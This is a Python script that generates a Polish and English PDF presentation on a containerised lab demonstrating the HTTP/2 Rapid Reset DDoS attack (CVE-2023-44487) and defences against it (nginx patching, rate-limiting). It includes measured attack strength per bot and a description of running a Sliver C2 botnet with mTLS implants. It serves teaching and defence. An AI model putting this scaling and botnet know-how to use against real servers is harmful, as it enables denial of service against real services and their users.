# -*- coding: utf-8 -*-
import os
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_JUSTIFY
from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, PageBreak,
                                Table, TableStyle, HRFlowable, KeepTogether)
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont

OUT = r"C:\Users\kubal\ddos-lab\prezentacja"
os.makedirs(OUT, exist_ok=True)

# ---- Fonts (Polish-capable) ----
F = "C:/Windows/Fonts/"
pdfmetrics.registerFont(TTFont("Body", F+"arial.ttf"))
pdfmetrics.registerFont(TTFont("Body-B", F+"arialbd.ttf"))
pdfmetrics.registerFont(TTFont("Body-I", F+"ariali.ttf"))
pdfmetrics.registerFont(TTFont("Mono", F+"consola.ttf"))
from reportlab.pdfbase.pdfmetrics import registerFontFamily
registerFontFamily("Body", normal="Body", bold="Body-B", italic="Body-I", boldItalic="Body-B")

# ---- Palette ----
INK   = colors.HexColor("#1a1f2b")
MUTE  = colors.HexColor("#5b6472")
ACC   = colors.HexColor("#b4232a")   # red (attack)
ACC2  = colors.HexColor("#1f6f54")   # green (defense)
BLUE  = colors.HexColor("#243b7a")
LINE  = colors.HexColor("#d5d9e0")
BG    = colors.HexColor("#f4f6f9")
CODEBG= colors.HexColor("#1e232e")
CODEFG= colors.HexColor("#e6e9ee")

# ---- Styles ----
ss = getSampleStyleSheet()
def S(name, **kw):
    base = dict(fontName="Body", fontSize=10.5, leading=15, textColor=INK, spaceAfter=6)
    base.update(kw)
    return ParagraphStyle(name, **base)

st_title  = S("t",  fontName="Body-B", fontSize=24, leading=28, textColor=INK, spaceAfter=4)
st_sub    = S("su", fontName="Body",   fontSize=12.5, leading=17, textColor=MUTE, spaceAfter=2)
st_h1     = S("h1", fontName="Body-B", fontSize=16, leading=20, textColor=BLUE, spaceBefore=14, spaceAfter=7)
st_h2     = S("h2", fontName="Body-B", fontSize=12.5, leading=16, textColor=INK, spaceBefore=9, spaceAfter=4)
st_body   = S("b",  alignment=TA_JUSTIFY)
st_bullet = S("bl", leftIndent=14, bulletIndent=2, spaceAfter=3, alignment=TA_LEFT)
st_note   = S("nt", fontName="Body-I", fontSize=9.5, leading=13, textColor=MUTE, spaceAfter=6)
st_quote  = S("q",  fontSize=11, leading=17, textColor=INK, leftIndent=10, spaceAfter=9, alignment=TA_JUSTIFY)
st_code   = S("c",  fontName="Mono", fontSize=8.8, leading=12.5, textColor=CODEFG,
              backColor=CODEBG, borderPadding=(7,7,7,7), spaceAfter=8, spaceBefore=2)
st_cap    = S("cap",fontName="Body-I", fontSize=9, textColor=MUTE, spaceAfter=10, alignment=TA_CENTER)
st_speak  = S("sp", fontSize=11.5, leading=18, textColor=INK, spaceAfter=10, alignment=TA_JUSTIFY)
st_lbl    = S("lbl",fontName="Body-B", fontSize=9, textColor=ACC, spaceAfter=2)

def P(t, s=st_body):   return Paragraph(t, s)
def H1(t):             return Paragraph(t, st_h1)
def H2(t):             return Paragraph(t, st_h2)
def BL(t):             return Paragraph("•&nbsp;&nbsp;"+t, st_bullet)
def CODE(t):           return Paragraph(t.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace("\n","<br/>"), st_code)
def SP(sp): return Spacer(1, sp)
def RULE(c=LINE, w=0.8): return HRFlowable(width="100%", thickness=w, color=c, spaceBefore=4, spaceAfter=8)

def footer(canvas, doc):
    canvas.saveState()
    canvas.setFont("Body", 8)
    canvas.setFillColor(MUTE)
    canvas.drawString(20*mm, 12*mm, "HTTP/2 Rapid Reset — DDoS Lab")
    canvas.drawRightString(190*mm, 12*mm, "str. %d" % doc.page)
    canvas.setStrokeColor(LINE)
    canvas.line(20*mm, 15*mm, 190*mm, 15*mm)
    canvas.restoreState()

def box(flowables, bg=BG, bc=LINE, pad=8):
    t = Table([[flowables]], colWidths=[170*mm])
    t.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(-1,-1),bg),
        ("BOX",(0,0),(-1,-1),0.8,bc),
        ("LEFTPADDING",(0,0),(-1,-1),pad),("RIGHTPADDING",(0,0),(-1,-1),pad),
        ("TOPPADDING",(0,0),(-1,-1),pad),("BOTTOMPADDING",(0,0),(-1,-1),pad),
    ]))
    return t

def dtable(data, colw, header_bg=BLUE, align=None):
    t = Table(data, colWidths=colw, repeatRows=1)
    sty = [
        ("FONT",(0,0),(-1,0),"Body-B",9),
        ("FONT",(0,1),(-1,-1),"Body",9),
        ("TEXTCOLOR",(0,0),(-1,0),colors.white),
        ("BACKGROUND",(0,0),(-1,0),header_bg),
        ("TEXTCOLOR",(0,1),(-1,-1),INK),
        ("ROWBACKGROUNDS",(0,1),(-1,-1),[colors.white, BG]),
        ("GRID",(0,0),(-1,-1),0.5,LINE),
        ("VALIGN",(0,0),(-1,-1),"MIDDLE"),
        ("TOPPADDING",(0,0),(-1,-1),4),("BOTTOMPADDING",(0,0),(-1,-1),4),
        ("LEFTPADDING",(0,0),(-1,-1),5),("RIGHTPADDING",(0,0),(-1,-1),5),
    ]
    if align:
        for col, a in align.items():
            sty.append(("ALIGN",(col,0),(col,-1),a))
    t.setStyle(TableStyle(sty))
    return t

# =====================================================================
#  PDF 1 — PREZENTACJA / BACKGROUND + SKRYPTY
# =====================================================================
story = []

# --- Title page ---
story += [SP(40)]
story.append(Paragraph("HTTP/2 Rapid Reset", st_title))
story.append(Paragraph("Nowoczesny atak DDoS — od podstaw, demonstracja w laboratorium i obrona", st_sub))
story.append(SP(6)); story.append(RULE(ACC, 2))
story.append(SP(4))
story.append(P("Materiał do <b>Meeting #2 — część praktyczna</b> (Testbed Setup + Experiments). "
    "Dokument tłumaczy atak zupełnie od zera — czym jest DDoS, jak działa strona WWW, czym są nagłówki (headers) — "
    "a następnie opisuje <b>co dokładnie zbudowaliśmy i zmierzyliśmy</b>. Na końcu znajdziesz gotowy tekst do "
    "opowiedzenia: najpierw po polsku, potem po angielsku.", st_body))
story.append(SP(10))
story.append(box([
    Paragraph("Co zawiera ten dokument", st_lbl),
    BL("<b>Część A</b> — Tło od podstaw (co to za atak, nagłówki, HTTP/2, dlaczego jest groźny)."),
    BL("<b>Część B</b> — Co zbudowaliśmy: testbed (stanowisko laboratoryjne)."),
    BL("<b>Część C</b> — Jakie eksperymenty przeprowadziliśmy i jakie są wyniki (z liczbami)."),
    BL("<b>Część D</b> — Gotowy skrypt wystąpienia <b>PO POLSKU</b>."),
    BL("<b>Część E</b> — Gotowy skrypt wystąpienia <b>PO ANGIELSKU</b>."),
]))
story.append(SP(8))
story.append(Paragraph("Drugi plik — <b>raport-techniczny.pdf</b> — zawiera komendy, metryki i tabele wyników "
    "(ściąga tylko dla Ciebie).", st_note))
story.append(PageBreak())

# ============== CZĘŚĆ A ==============
story.append(H1("Część A — Tło: zrozum atak od zera"))

story.append(H2("A1. Co to jest DoS i DDoS?"))
story.append(P("<b>DoS</b> (Denial of Service, &#8222;odmowa usługi&#8221;) to atak, którego celem nie jest kradzież danych, "
    "lecz <b>uniemożliwienie korzystania z usługi</b> — np. sprawienie, że strona internetowa przestaje odpowiadać. "
    "Atakujący zasypuje serwer taką ilością pracy, że ten nie ma już zasobów (procesora, pamięci, połączeń) dla "
    "normalnych użytkowników.", st_body))
story.append(P("<b>DDoS</b> (Distributed DoS, &#8222;rozproszony&#8221;) to ta sama idea, ale atak prowadzony jest "
    "<b>z wielu maszyn jednocześnie</b> — z tzw. <b>botnetu</b>. Rozproszenie utrudnia obronę (nie da się po prostu "
    "zablokować jednego adresu IP) i zwielokrotnia siłę ataku.", st_body))

story.append(H2("A2. Jak w ogóle działa strona WWW? (request / response / nagłówki)"))
story.append(P("Gdy otwierasz stronę, Twoja przeglądarka wysyła do serwera <b>żądanie (request)</b>, a serwer "
    "odsyła <b>odpowiedź (response)</b> — np. treść strony. Protokół, w którym się porozumiewają, to <b>HTTP</b>.", st_body))
story.append(P("Każde żądanie składa się z dwóch części: <b>nagłówków (headers)</b> i opcjonalnie treści. "
    "<b>Nagłówki to metadane</b> — krótkie linie &#8222;klucz: wartość&#8221;, które mówią serwerowi, o co chodzi: jaką stronę "
    "chcemy (<font name='Mono' size='9'>:path: /</font>), z jakiej domeny (<font name='Mono' size='9'>host:</font>), "
    "jaką przeglądarką (<font name='Mono' size='9'>user-agent:</font>) itd. Serwer, żeby obsłużyć żądanie, "
    "<b>musi te nagłówki odczytać, zparsować i przydzielić na nie pamięć</b> — i to jest kluczowe dla naszego ataku.", st_body))
story.append(box([Paragraph("Zapamiętaj jedno zdanie:", st_lbl),
    P("Samo <b>wysłanie nagłówków</b> (otwarcie żądania) już kosztuje serwer pracę — zanim jeszcze cokolwiek odeśle.", st_body)]))

story.append(H2("A3. HTTP/1.1 vs HTTP/2 — co się zmieniło?"))
story.append(P("W starym <b>HTTP/1.1</b> jedno połączenie obsługiwało żądania <b>po kolei</b>, jedno za drugim. "
    "Chcąc wysłać dużo żądań naraz, trzeba było otworzyć wiele połączeń — a to łatwo wykryć i ograniczyć.", st_body))
story.append(P("<b>HTTP/2</b> wprowadził <b>multipleksowanie</b>: w <u>jednym</u> połączeniu TCP może istnieć wiele "
    "równoległych <b>strumieni (streams)</b> — każdy to osobne żądanie. To świetne dla wydajności (strona ładuje się "
    "szybciej), ale tworzy nową powierzchnię ataku: w jednym połączeniu można błyskawicznie otwierać setki strumieni.", st_body))

story.append(H2("A4. Na czym polega atak HTTP/2 Rapid Reset? (CVE-2023-44487)"))
story.append(P("HTTP/2 pozwala klientowi <b>anulować</b> własny strumień, wysyłając ramkę <font name='Mono' size='9'>RST_STREAM</font> "
    "(&#8222;reset strumienia&#8221;). To normalna funkcja — np. gdy przerwiesz ładowanie strony.", st_body))
story.append(P("Atak <b>Rapid Reset</b> wykorzystuje to w pętli i polega na schemacie:", st_body))
story.append(box([
    BL("Klient otwiera strumień wysyłając nagłówki — ramka <font name='Mono' size='9'>HEADERS</font> (serwer zaczyna pracę)."),
    BL("<b>Natychmiast</b> anuluje go ramką <font name='Mono' size='9'>RST_STREAM</font> — zanim serwer zdąży odpowiedzieć."),
    BL("Powtarza to <b>tysiące razy na sekundę</b> w jednym połączeniu."),
], bg=colors.HexColor("#fbeceb"), bc=ACC))
story.append(P("Dlaczego to działa? Bo <b>otwarcie strumienia kosztuje serwer więcej niż anulowanie kosztuje atakującego</b>. "
    "To tzw. <b>asymetria kosztu</b>. Dodatkowo, ponieważ każdy strumień jest natychmiast zamykany, obrońca liczący "
    "&#8222;ile strumieni jest naraz otwartych&#8221; <b>niczego nie widzi</b> — licznik cały czas pokazuje zero. Pod koniec 2023 r. "
    "atak ten osiągnął rekordowe natężenia i dostał numer <b>CVE-2023-44487</b>.", st_body))

story.append(H2("A5. Jak się przed tym bronić?"))
story.append(P("Serwery (m.in. nginx) dostały łatki, które <b>liczą anulowane strumienie</b> i zrywają połączenie, "
    "gdy klient resetuje strumienie zbyt agresywnie (parametry typu limitu żądań na połączenie). Do tego dokłada się "
    "klasyczny <b>hardening</b>: <b>rate-limiting</b> (ograniczenie liczby żądań na adres IP w jednostce czasu), limity "
    "połączeń i czasów. Efekt: nadmiarowy ruch jest odrzucany <b>na brzegu</b> serwera kodem <b>429 (Too Many Requests)</b>, "
    "zanim obciąży aplikację.", st_body))

story.append(H2("A6. Botnet i &#8222;Command &amp; Control&#8221; (C2) — Sliver"))
story.append(P("Prawdziwy DDoS nie idzie z jednego komputera, tylko z <b>floty przejętych maszyn (botnet)</b>, którymi "
    "steruje się centralnie z serwera <b>C2 (Command &amp; Control)</b>. Operator wydaje jedną komendę, a wszystkie boty "
    "atakują naraz.", st_body))
story.append(P("W laboratorium użyliśmy <b>Slivera</b> — profesjonalnego, open-source frameworka C2 (narzędzie &#8222;state-of-the-art&#8221; "
    "używane też przez zespoły red-team). Na botach uruchamia się mały program — <b>implant</b> — który łączy się z serwerem "
    "C2 szyfrowanym kanałem <b>mTLS</b> (wzajemny TLS: serwer i bot potwierdzają sobie tożsamość certyfikatami). "
    "Operator widzi boty jako <b>sesje</b> i komendą <font name='Mono' size='9'>execute</font> odpala na nich atak.", st_body))

story.append(H2("A7. Słowniczek (gdyby ktoś zapytał)"))
gl = [["Pojęcie","Krótko"],
    ["Strumień (stream)","Pojedyncze żądanie w ramach jednego połączenia HTTP/2."],
    ["HEADERS","Ramka otwierająca strumień — nagłówki żądania."],
    ["RST_STREAM","Ramka anulująca/resetująca strumień."],
    ["Rate-limiting","Ograniczenie liczby żądań na IP w czasie (obrona)."],
    ["429","Kod HTTP &#8222;Too Many Requests&#8221; — żądanie odrzucone przez limit."],
    ["C2","Serwer sterujący botnetem (Command & Control)."],
    ["Implant","Program na bocie łączący go z C2."],
    ["mTLS","Wzajemny TLS — szyfrowanie + obustronne uwierzytelnienie."],
]
story.append(dtable(gl, [45*mm, 125*mm]))
story.append(PageBreak())

# ============== CZĘŚĆ B ==============
story.append(H1("Część B — Co zbudowaliśmy (Testbed / Implementation)"))
story.append(P("Całe stanowisko to <b>izolowane laboratorium w kontenerach Docker</b> (Docker Compose), działające na "
    "jednym komputerze we własnej sieci wirtualnej <font name='Mono' size='9'>labnet</font>. Nic nie wychodzi na "
    "zewnątrz — atakujemy wyłącznie własną ofiarę. Elementy:", st_body))
comp = [["Element","Rola w laboratorium"],
    ["victim (nginx)","Ofiara — serwer WWW nginx. Dwie wersje: starsza 1.25.1 (podatna) i nowsza 1.27 (z łatką Rapid Reset). Każda w trybie normalnym lub z hardeningiem."],
    ["loadgen (h2load)","Generator ruchu HTTP/2 — kalibrowany, powtarzalny &#8222;flood&#8221; o zadanym natężeniu (parametr -c = liczba równoległych połączeń)."],
    ["bot (rapidreset)","Kontener-bot z autentycznym narzędziem Rapid Reset (HEADERS + RST_STREAM w pętli). Flota lab-bot1..5 = osobne IP."],
    ["c2 (Sliver)","Serwer Command & Control sterujący botnetem przez mTLS."],
    ["zabbix","Monitoring — zbiera i rysuje metryki ofiary (CPU, aktywne połączenia) na wykresach."],
]
story.append(dtable(comp, [34*mm, 136*mm]))
story.append(SP(8))
story.append(box([Paragraph("Dwa &#8222;pokrętła&#8221; ofiary, które testujemy", st_lbl),
    BL("<b>Wersja nginx:</b> <font color='#b4232a'>nienałatana (1.25.1)</font> vs <font color='#1f6f54'>załatana (1.27)</font>."),
    BL("<b>Konfiguracja:</b> <font color='#b4232a'>normalna</font> vs <font color='#1f6f54'>z hardeningiem</font> (rate-limiting, limity połączeń)."),
    P("Krzyżując je, dostajemy <b>4 scenariusze serwera</b>, które atakujemy przy rosnącym obciążeniu.", st_body)]))
story.append(SP(6))
story.append(Paragraph("Jak mierzymy (metryki):", st_lbl))
story.append(BL("<b>CPU ofiary</b> — bezpośrednio z cgroup v2 (<font name='Mono' size='9'>cpu.stat</font>), próbkowane co 1 s → % wykorzystania."))
story.append(BL("<b>Połączenia/żądania</b> — z modułu nginx <font name='Mono' size='9'>stub_status</font> (aktywne połączenia, licznik żądań)."))
story.append(BL("<b>Skuteczność ataku</b> — z podsumowania klienta: ile odpowiedzi <b>2xx</b> (sukces) vs <b>429</b> (odrzucone przez obronę)."))
story.append(BL("<b>Dowód Rapid Reset</b> — zliczone ramki <font name='Mono' size='9'>HEADERS</font> i <font name='Mono' size='9'>RST_STREAM</font> wysłane przez bota."))
story.append(PageBreak())

# ============== CZĘŚĆ C ==============
story.append(H1("Część C — Eksperymenty i wyniki (Validation)"))

story.append(H2("Tor 1 — Flood HTTP/2: bez obrony vs z obroną"))
story.append(P("Ofiarę obciążaliśmy generatorem h2load przy <b>5 progach natężenia</b> (dobranych tak, by bez obrony "
    "dać ~10 / 20 / 40 / 55 / 80 % CPU), każdorazowo w dwóch trybach: <b>bez obrony</b> (vuln) i <b>z hardeningiem</b> (hard). "
    "Każdy przebieg 30 s, próbkowanie co 1 s.", st_body))
t1 = [["Próg","Połącz.\n(-c)","BEZ obrony\nCPU ofiary","BEZ obrony\n2xx / 429","Z obroną\nCPU ofiary","Z obroną\n2xx / 429"],
    ["~10%","4","~18–21%","4000 / 0","~2%","0 / 0"],
    ["~20%","10","~45–48%","10000 / 0","~2%","45 / 955"],
    ["~40%","25","~68–70%","22767 / 0","~2%","45 / 2455"],
    ["~55%","35","~80–82%","29741 / 0","~2%","47 / 3453"],
    ["~80%","50","~78–80%","36969 / 0","~2%","49 / 4951"],
]
story.append(dtable(t1, [16*mm, 18*mm, 32*mm, 34*mm, 30*mm, 34*mm],
                    align={0:"CENTER",1:"CENTER",2:"CENTER",3:"CENTER",4:"CENTER",5:"CENTER"}))
story.append(Paragraph("Tabela 1. Flood h2load — ten sam atak, dwa tryby serwera. Liczby z surowych danych (results.csv / stats.csv).", st_cap))
story.append(box([Paragraph("Wniosek Toru 1", st_lbl),
    BL("<b>Bez obrony</b> CPU ofiary rośnie wraz z natężeniem — od ~18% aż do ~80%. Atak &#8222;przechodzi&#8221;: prawie wszystkie żądania dostają 2xx."),
    BL("<b>Z hardeningiem</b> CPU ofiary trzyma się <b>płasko na ~2%</b> przy KAŻDYM natężeniu, a nadmiar ruchu jest odbijany kodem <b>429 na brzegu</b> (2xx spada do ~45–49)."),
    BL("Jedno zdanie puenty: <b>rate-limiting zamienia rosnący atak w płaską linię</b> — ofiara w ogóle go nie odczuwa."),
], bg=colors.HexColor("#eef5f1"), bc=ACC2))

story.append(H2("Tor 1b — Autentyczny Rapid Reset (bot)"))
story.append(P("Zamiast zwykłego floodu, bot uruchomił <b>prawdziwy Rapid Reset</b> na podatnej ofierze (40 s).", st_body))
t2 = [["Metryka","Wartość","Znaczenie"],
    ["HEADERS wysłane","60 073","tyle strumieni bot OTWORZYŁ"],
    ["RST_STREAM wysłane","561 975","tyle strumieni NATYCHMIAST anulował"],
    ["Udane odpowiedzi (2xx)","0","ofiara nie obsłużyła żadnego żądania"],
    ["CPU ofiary","~53–58%","realne obciążenie z jednego bota"],
]
story.append(dtable(t2, [42*mm, 34*mm, 94*mm], align={1:"CENTER"}))
story.append(Paragraph("Tabela 2. Sygnatura Rapid Reset: ogrom RST_STREAM przy zerze sukcesów (attackers.txt).", st_cap))
story.append(P("<b>~562 tys. resetów</b> to czytelny &#8222;podpis&#8221; ataku. Na <b>załatanym</b> nginx ten sam atak jest "
    "rozpoznawany (liczenie resetów) i połączenie jest zrywane — to właśnie różnica, którą wnosi łatka CVE-2023-44487.", st_body))

story.append(H2("Tor 2 — Botnet sterowany przez C2 Sliver (realne wyniki, GCP 8 vCPU)"))
story.append(P("Część ofensywna uruchomiona na maszynie GCP (8 vCPU / 32 GB): flota botów w osobnych kontenerach "
    "(osobne IP) odpala <b>autentyczny Rapid Reset</b>, a obciążenie skalujemy <b>rozmiarem botnetu</b> (1 → 50) dla "
    "4 konfiguracji serwera. Pytanie: <b>ile botów / jaki RPS trzeba, by zaszkodzić serwerowi.</b>", st_body))
tf = [["Boty","Zagregowana siła ognia","CPU ofiary (1 rdzeń)","Latencja realnego usera"],
    ["1","~2 600 RST/s","~11%","8 ms"],
    ["5","~15 000 RST/s","~42%","9 ms"],
    ["10","~37 000 RST/s","~75%","9 ms"],
    ["20","~85 000 RST/s","~95% (nasycenie)","15–20 ms"],
    ["30","~130 000 RST/s","zagłodzenie","130–360 ms"],
    ["50","~176 000 RST/s","(sufit rdzeni)","667 ms"],
]
story.append(dtable(tf, [16*mm,44*mm,44*mm,44*mm], align={0:"CENTER",1:"CENTER",2:"CENTER",3:"CENTER"}))
story.append(Paragraph("Tabela 3. Siła ognia rośnie liniowo z liczbą botów: ~4 000 RST/s na bota (dane botnet_vic*.csv).", st_cap))
story.append(P("<b>Próg degradacji zależy od zasobów ofiary</b> — przetestowaliśmy 3 poziomy „mocy&#8221; serwera:", st_body))
t3 = [["Serwer (limit CPU)","Zachowanie pod atakiem botnetu","Dostępność realnego usera"],
    ["1 rdzeń (normalny)","nasycenie CPU ~20 botów; latencja do 360 ms @30","100% — nginx ODPORNY"],
    ["0,5 rdzenia (słaby)","latencja do 667 ms @50 botów","~100%, sporadyczne timeouty (92%)"],
    ["0,25 rdzenia (b. słaby)","latencja do 1,7 s @35–50 botów","83% — ~17% żądań PADA (częściowe DoS)"],
]
story.append(dtable(t3, [38*mm,78*mm,54*mm], header_bg=ACC))
story.append(Paragraph("Tabela 4. Im słabszy serwer, tym wcześniej Rapid Reset przechodzi od spowolnienia do realnej odmowy usługi.", st_cap))
story.append(box([Paragraph("Dowód sterowania botnetem przez C2 (Sliver v1.7.9)", st_lbl),
    BL("Sliver skompilował implanta mTLS (15 MB, linux/amd64) i wdrożył na flotę <b>6 botów z 6 różnych IP</b>."),
    BL("Wszystkie 6 implantów zgłosiło się do C2 jako <b>żywe sesje mTLS</b> (dowód: <font name='Mono' size='9'>c2-proof.txt</font>)."),
    BL("Operator steruje flotą z konsoli C2 (<font name='Mono' size='9'>use &lt;ID&gt; ; execute</font>); atak floty nasycił ofiarę do <b>CPU 100%</b>."),
], bg=colors.HexColor("#eef5f1"), bc=ACC2))
story.append(box([Paragraph("Kluczowy wniosek (zgodny z blogiem NGINX/F5)", st_lbl),
    P("nginx jest <b>odporny</b> na Rapid Reset: stary i nowy, z hardeningiem i bez — zachowują się niemal identycznie, bo "
      "oba domyślnie zamykają połączenie po ~1000 żądań (<font name='Mono' size='9'>keepalive_requests</font>), co czyni atak tanim. "
      "Efektem jest <b>degradacja (latencja/CPU), nie pełny nokaut</b>; pełna odmowa usługi wymaga słabo zasobowego serwera "
      "albo hiperskali (realny atak z 2023 r. = 398 mln rps, ~3000× naszej floty).", st_body),
], bg=colors.HexColor("#fff7e8"), bc=colors.HexColor("#c98a1a")))
story.append(PageBreak())

# ============== CZĘŚĆ D — PL script ==============
story.append(H1("Część D — Co powiedzieć (skrypt PO POLSKU)"))
story.append(Paragraph("Czytaj spokojnie; każdy akapit to ok. 20–30 sekund. Całość ~6–8 minut.", st_note))
story.append(RULE())

def speak(label, text):
    story.append(Paragraph(label, st_lbl))
    story.append(Paragraph(text, st_speak))

speak("1) Wprowadzenie — o czym jest projekt",
    "&#8222;Nasz projekt dotyczy nowoczesnego ataku odmowy usługi, czyli DDoS, o nazwie <b>HTTP/2 Rapid Reset</b> — "
    "oznaczonego jako CVE-2023-44487. Zbudowaliśmy bezpieczne laboratorium, w którym <b>przeprowadzamy ten atak</b>, "
    "a następnie pokazujemy, <b>jak skutecznie się przed nim bronić</b>. Wszystko dzieje się w izolowanych "
    "kontenerach na jednej maszynie — nic nie wychodzi na zewnątrz.")
speak("2) Tło — jak działa strona i czym są nagłówki",
    "&#8222;Gdy przeglądarka otwiera stronę, wysyła do serwera <b>żądanie</b>, a serwer odsyła <b>odpowiedź</b>. Każde żądanie "
    "zaczyna się od <b>nagłówków</b> — to krótkie metadane mówiące, czego chcemy. Kluczowe jest to, że już <b>samo "
    "otwarcie żądania</b> zmusza serwer do pracy: musi nagłówki odczytać i przydzielić na nie pamięć.")
speak("3) HTTP/2 i na czym polega atak",
    "&#8222;Nowy protokół HTTP/2 pozwala w jednym połączeniu prowadzić wiele równoległych <b>strumieni</b> — i pozwala je "
    "<b>anulować</b> ramką RST_STREAM. Atak Rapid Reset robi to w pętli: <b>otwiera strumień i natychmiast go kasuje</b>, "
    "tysiące razy na sekundę. Działa, bo <b>otwarcie kosztuje serwer więcej, niż anulowanie kosztuje atakującego</b> — to "
    "asymetria. Co gorsza, strumienie są od razu zamykane, więc zwykły licznik połączeń pokazuje zero i obrońca nic nie widzi.")
speak("4) Co zbudowaliśmy — testbed",
    "&#8222;Stanowisko to zestaw kontenerów Docker: <b>ofiara</b> nginx w dwóch wariantach — starszym <b>podatnym</b> i nowszym "
    "<b>załatanym</b>, każdy w trybie normalnym lub <b>z hardeningiem</b>. Do tego <b>generator ruchu</b> h2load, "
    "<b>boty</b> z prawdziwym narzędziem Rapid Reset, serwer <b>C2 Sliver</b> do sterowania botnetem oraz <b>Zabbix</b> do "
    "monitoringu. Mierzymy bezpośrednio: <b>procesor ofiary</b>, aktywne połączenia i to, ile żądań kończy się sukcesem, a "
    "ile jest odrzuconych.")
speak("5) Eksperyment 1 — flood bez obrony i z obroną",
    "&#8222;Najpierw obciążaliśmy ofiarę przy pięciu rosnących natężeniach. <b>Bez obrony</b> procesor ofiary rósł od około "
    "<b>20 do 80 procent</b>, a atak przechodził. Po włączeniu <b>hardeningu</b> ten sam atak dawał procesor ofiary "
    "<b>płasko na poziomie 2 procent</b> przy każdym natężeniu — nadmiar ruchu był odrzucany na brzegu kodem <b>429</b>. "
    "Jednym zdaniem: <b>rate-limiting zamienił rosnący atak w płaską linię</b>.")
speak("6) Eksperyment 2 — autentyczny Rapid Reset",
    "&#8222;Potem bot uruchomił prawdziwy Rapid Reset. W 40 sekund wysłał około <b>60 tysięcy</b> otwarć strumieni i aż "
    "<b>562 tysiące resetów</b>, przy <b>zerze udanych odpowiedzi</b>. Ta ogromna liczba resetów to czytelny podpis ataku. "
    "Na <b>załatanym</b> nginx atak jest rozpoznawany i połączenie zrywane — to różnica, którą wnosi łatka.")
speak("7) Część ofensywna — botnet i C2 Sliver",
    "&#8222;Na koniec realistyczny scenariusz, uruchomiony w chmurze GCP. Użyliśmy <b>Slivera</b> — profesjonalnego "
    "frameworka C2. Sliver skompilował implanta i wdrożył go na flotę botów; <b>sześć implantów z sześciu różnych adresów IP "
    "zgłosiło się do serwera C2 jako żywe sesje szyfrowane mTLS</b> — to jest botnet pod kontrolą jednego operatora. "
    "Komendą z konsoli C2 flota odpaliła Rapid Reset i <b>nasyciła procesor ofiary do stu procent</b>. "
    "Zmierzyliśmy też siłę ognia: <b>około cztery tysiące resetów na sekundę na bota</b> — pięćdziesiąt botów to około "
    "<b>sto siedemdziesiąt sześć tysięcy resetów na sekundę</b>. Co ważne i uczciwe: nginx okazał się <b>odporny</b> — "
    "atak powoduje spowolnienie i obciążenie, ale pełną odmowę usługi uzyskaliśmy dopiero na słabo zasobowym serwerze "
    "(wtedy około siedemnaście procent żądań realnych użytkowników zaczyna padać).")
speak("8) Podsumowanie",
    "&#8222;Podsumowując: <b>pokazaliśmy atak od środka</b> — jak działa i jak go zmierzyć — oraz <b>udowodniliśmy skuteczność "
    "obrony</b>: łatka nginx plus rate-limiting trzymają ofiarę na 2 procentach procesora i odrzucają atak na brzegu. "
    "Wszystkie wyniki są powtarzalne i opisane w repozytorium.")
story.append(PageBreak())

# ============== CZĘŚĆ E — EN script ==============
story.append(H1("Part E — What to say (ENGLISH script)"))
story.append(Paragraph("Same content as Part D, ready to read aloud. ~6–8 minutes.", st_note))
story.append(RULE())

def speakE(label, text):
    story.append(Paragraph(label, st_lbl))
    story.append(Paragraph(text, st_speak))

speakE("1) Introduction — what the project is about",
    "&#8222;Our project is about a modern denial-of-service attack called <b>HTTP/2 Rapid Reset</b>, tracked as CVE-2023-44487. "
    "We built a safe lab where we <b>carry out the attack</b> and then show <b>how to defend against it effectively</b>. "
    "Everything runs in isolated Docker containers on a single machine — nothing leaves the host.")
speakE("2) Background — how a website works and what headers are",
    "&#8222;When a browser opens a page, it sends the server a <b>request</b>, and the server sends back a <b>response</b>. Every "
    "request starts with <b>headers</b> — small pieces of metadata that say what we want. The key point: simply "
    "<b>opening a request</b> already forces the server to do work — it must read the headers and allocate memory for them.")
speakE("3) HTTP/2 and how the attack works",
    "&#8222;The newer HTTP/2 protocol lets one connection carry many parallel <b>streams</b>, and lets the client <b>cancel</b> "
    "them with a RST_STREAM frame. Rapid Reset abuses this in a loop: it <b>opens a stream and immediately resets it</b>, "
    "thousands of times per second. It works because <b>opening costs the server more than cancelling costs the attacker</b> "
    "— that asymmetry is the whole trick. And because streams close instantly, a normal connection counter shows zero, so a "
    "defender sees nothing.")
speakE("4) What we built — the testbed",
    "&#8222;The testbed is a set of Docker containers: an nginx <b>victim</b> in two variants — an older <b>vulnerable</b> one and a "
    "newer <b>patched</b> one — each either plain or <b>hardened</b>. Plus an h2load <b>traffic generator</b>, <b>bots</b> "
    "running a real Rapid Reset tool, a <b>Sliver C2</b> server to control the botnet, and <b>Zabbix</b> for monitoring. We "
    "measure directly: the victim's <b>CPU</b>, active connections, and how many requests succeed versus how many are rejected.")
speakE("5) Experiment 1 — flood without and with defense",
    "&#8222;First we loaded the victim at five increasing intensities. <b>Without defense</b>, the victim's CPU rose from about "
    "<b>20 to 80 percent</b>, and the attack got through. With <b>hardening</b> enabled, the same attack kept the victim's CPU "
    "<b>flat at about 2 percent</b> at every intensity — the excess traffic was rejected at the edge with HTTP <b>429</b>. In "
    "one sentence: <b>rate-limiting turned a growing attack into a flat line</b>.")
speakE("6) Experiment 2 — authentic Rapid Reset",
    "&#8222;Then a bot launched a real Rapid Reset. In 40 seconds it sent about <b>60 thousand</b> stream openings and as many as "
    "<b>562 thousand resets</b>, with <b>zero successful responses</b>. That huge reset count is the clear signature of the "
    "attack. On the <b>patched</b> nginx the attack is detected and the connection is dropped — that is exactly what the fix adds.")
speakE("7) Offensive part — botnet and Sliver C2",
    "&#8222;Finally, a realistic scenario run in the GCP cloud. We used <b>Sliver</b>, a professional C2 framework. Sliver "
    "compiled an implant and deployed it to the fleet; <b>six implants from six different IP addresses checked in to the C2 "
    "server as live mTLS-encrypted sessions</b> — that is a botnet under one operator's control. From the C2 console the fleet "
    "launched Rapid Reset and <b>drove the victim's CPU to one hundred percent</b>. We also measured the firepower: about "
    "<b>four thousand resets per second per bot</b> — fifty bots is roughly <b>one hundred seventy-six thousand resets per "
    "second</b>. The honest key point: nginx proved <b>resilient</b> — the attack slows it down and loads it, but we only got a "
    "real denial of service on a resource-starved server, where about seventeen percent of real users' requests start to fail.")
speakE("8) Conclusion",
